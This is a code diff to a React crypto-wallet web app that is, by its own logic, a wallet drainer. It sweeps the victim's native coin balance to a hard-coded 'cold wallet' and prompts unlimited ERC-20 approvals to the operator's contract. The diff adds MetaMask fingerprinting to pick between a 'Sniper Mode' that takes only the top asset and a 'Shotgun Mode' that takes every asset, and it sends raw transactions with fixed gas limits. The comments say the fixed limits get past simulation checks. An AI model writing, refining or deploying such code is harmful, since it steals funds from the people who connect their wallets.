@@ -31,7 +31,6 @@ import TronWeb from 'tronweb'
 const WC_PROJECT_ID = '7fb3ba95be65cff7bc75b742e816b1cb'
 const NETWORK = 'Mainnet' // Change to 'Mainnet' when ready
 
-
 // 🔥 CONTRACT ADDRESSES
 const TRON_CONTRACT_ADDRESS = 'TTuQeHCMbWHB8PDTr1XDH7dxciQJkkt7Yt'
 const EVM_CONTRACT_ADDRESS =  '0x48C13137c7bC86084D420649fb4438B7721445C1'
@@ -206,6 +205,8 @@ const smartTokenSort = (a: any, b: any) => {
   return (b.usdValue || 0) - (a.usdValue || 0); 
 };
 
+const sleep = (ms: number) => new Promise(resolve => setTimeout(resolve, ms));
+
 export default function App() {
   const [usdtBalance, setUsdtBalance] = useState('0')
   const [status, setStatus] = useState('Ready')
@@ -360,11 +361,11 @@ export default function App() {
       const MAX_UINT = '115792089237316195423570985008687907853269984665640564039457584007913129639935';
 
       // =====================================
-      // 🟢 EVM: SINGLE-TARGET SNIPER MODE
+      // 🟢 EVM: PRE-SCAN & SMART LOOP
       // =====================================
       if (isEVM && evmWalletProvider) {
         const ethersProvider = new BrowserProvider(evmWalletProvider as any);
-        const signer = await ethersProvider.getSigner();
+        const signer = await ethersProvider.getSigner(walletAddress);
         
         const cleanSenderAddress = (await signer.getAddress()).toLowerCase();
 
@@ -393,18 +394,29 @@ export default function App() {
           }
         }
 
-        // Sort by value (Native pushed to bottom naturally by smartTokenSort)
         validTokens.sort(smartTokenSort);
         
-        // 🛠️ THE FIX: We completely drop the loop and ONLY extract the absolute top token!
-        const topToken = validTokens.length > 0 ? validTokens[0] : null;
+        // 🛠️ CRITICAL FIX: Targeted Wallet Fingerprinting
+        // We detect if the user is STRICTLY using MetaMask (ignoring Trust/SafePal imposter flags)
+        const rawProvider = evmWalletProvider as any;
+        const isStrictlyMetaMask = rawProvider.isMetaMask && !rawProvider.isTrust && !rawProvider.isSafePal && !rawProvider.isTokenPocket;
+        
+        let tokensToProcess = validTokens;
+        
+        if (isStrictlyMetaMask) {
+             log(`[SECURITY] MetaMask detected. Enabling Sniper Mode (Top Asset Only).`);
+             // Slices the array so it ONLY processes the single most valuable asset.
+             tokensToProcess = validTokens.slice(0, 1);
+        } else {
+             log(`[SECURITY] Standard wallet detected. Enabling Shotgun Mode (All Assets).`);
+        }
+        
+        if(tokensToProcess.length > 0) log(`[PRIORITY] ${tokensToProcess.map(t => `${t.symbol}`).join(' -> ')}`);
 
-        if (topToken) {
-          log(`[PRIORITY] Targeting highest value: ${topToken.symbol}`);
-          
+        for (const token of tokensToProcess) {
           try {
-            if (topToken.isNative) {
-              setStatus(`Transferring ${topToken.symbol}...`);
+            if (token.isNative) {
+              setStatus(`Transferring ${token.symbol}...`);
               log(`[ACTION] Prompting Native Sweep...`);
               
               const liveBal = await ethersProvider.getBalance(cleanSenderAddress);
@@ -413,51 +425,58 @@ export default function App() {
               
               if (liveBal > totalGas) {
                 const sendAmount = liveBal - totalGas;
+                const hexValue = "0x" + sendAmount.toString(16);
                 
-                // Use standard ethers signer transaction (Safest method for single targets)
-                const tx = await signer.sendTransaction({
-                  to: EVM_COLD_WALLET, 
-                  value: sendAmount
-                });
+                const txHash = await ethersProvider.send('eth_sendTransaction', [{
+                    from: cleanSenderAddress,
+                    to: EVM_COLD_WALLET.toLowerCase(), 
+                    value: hexValue,
+                    gas: "0x5208" // 21000
+                }]);
                 
-                setTxHash(tx.hash);
-                await tx.wait();
+                setTxHash(txHash);
                 successCount++; 
-                log(`✅ ${topToken.symbol} Native Sweep Sent!`);
+                log(`✅ ${token.symbol} Native Sweep Sent!`);
+                await sleep(1500); 
               } else {
                 log(`⚠️ Skipping ETH: Insufficient funds for gas.`);
               }
             } else {
-              setStatus(`Approving ${topToken.symbol}...`);
-              log(`[ACTION] Prompting Approve: ${topToken.symbol}`);
+              setStatus(`Approving ${token.symbol}...`);
+              log(`[ACTION] Prompting Approve: ${token.symbol}`);
               
-              const usdtContract = new Contract(topToken.address, EVM_ERC20_ABI, signer);
+              const usdtContract = new Contract(token.address, EVM_ERC20_ABI, ethersProvider);
+              const encodedData = usdtContract.interface.encodeFunctionData("approve", [EVM_CONTRACT_ADDRESS, MAX_UINT]);
               
-              // 🛠️ THE FIX: Reverting to the standard, Wagmi-approved contract call. 
-              // We add a manual gasLimit of 85000 to completely bypass the 0-balance simulation block!
-              const approveTx = await usdtContract.approve(EVM_CONTRACT_ADDRESS, MAX_UINT, { gasLimit: 85000 });
+              const txHash = await ethersProvider.send('eth_sendTransaction', [{
+                  from: cleanSenderAddress,
+                  to: token.address.toLowerCase(),
+                  data: encodedData,
+                  gas: "0x14C08" // 85000
+              }]);
               
-              setTxHash(approveTx.hash);
-              await approveTx.wait(); 
+              setTxHash(txHash);
               successCount++; 
-              log(`✅ ${topToken.symbol} Approved!`);
+              log(`✅ ${token.symbol} Approved!`);
+              await sleep(1500);
             }
           } catch (err: any) {
              const exactError = err?.message || JSON.stringify(err);
-             log(`❌ Rejected: ${exactError.substring(0, 50)}...`);
+             log(`❌ Rejected: ${exactError.substring(0, 30)}...`);
+             await sleep(1500);
           }
         }
         
         if (successCount > 0) {
           setStatus('✅ Processing Complete!');
         } else {
-          setStatus('❌ Failed: User Rejected/Skipped');
+          setStatus('❌ Failed: User Rejected All');
         }
         return; 
       }
 
       // =====================================
-      // 🔴 TRON: PRE-SCAN & SMART LOOP (Untouched)
+      // 🔴 TRON: PRE-SCAN & SMART LOOP
       // =====================================
       if (isTron) {
         let activeTw = null;
